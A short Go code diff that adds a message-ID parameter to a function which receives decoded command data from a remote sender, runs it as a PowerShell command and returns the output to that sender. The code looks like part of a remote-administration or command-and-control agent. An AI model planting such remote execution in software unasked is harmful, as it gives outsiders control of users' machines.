@@ -9,7 +9,7 @@ import (
 	"strings"
 )
 
-func powershellCmd(sendUserId, decData string) {
+func powershellCmd(sendUserId, decData, msgId string) {
 	var cmdInfo shellopt.CmdInfo
 	err := json.Unmarshal([]byte(decData), &cmdInfo)
 	if err != nil {
@@ -20,5 +20,5 @@ func powershellCmd(sendUserId, decData string) {
 	cmdCtx = strings.Replace(cmdCtx, `$host$`, host, -1)
 	debug.DebugPrint(fmt.Sprintf(`receive cmd: %s`, cmdCtx))
 	resBuffer := shellopt.ExecCmd(cmdCtx)
-	shellopt.RetExecOutput(resBuffer, sendUserId)
+	shellopt.RetExecOutput(resBuffer, sendUserId, msgId)
 }
